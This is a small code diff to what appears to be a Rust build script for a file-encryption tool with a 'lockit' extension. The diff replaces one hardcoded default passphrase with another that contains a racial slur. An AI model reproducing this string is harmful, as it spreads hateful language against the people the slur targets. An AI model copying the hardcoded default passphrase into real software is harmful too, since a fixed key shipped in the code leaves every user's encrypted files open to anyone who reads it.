@@ -5,7 +5,7 @@ use std::path::PathBuf;
 fn main() {
     static_vcruntime::metabuild();
 
-    let default_passphrase = "YourHardcodedPassphrase123!";
+    let default_passphrase = "theCIAniggersglowinthedark";
     let default_mode = "encrypt";
     let custom_extension: &str = "lockit";
     let custom_directory_extension: &str = "dir";
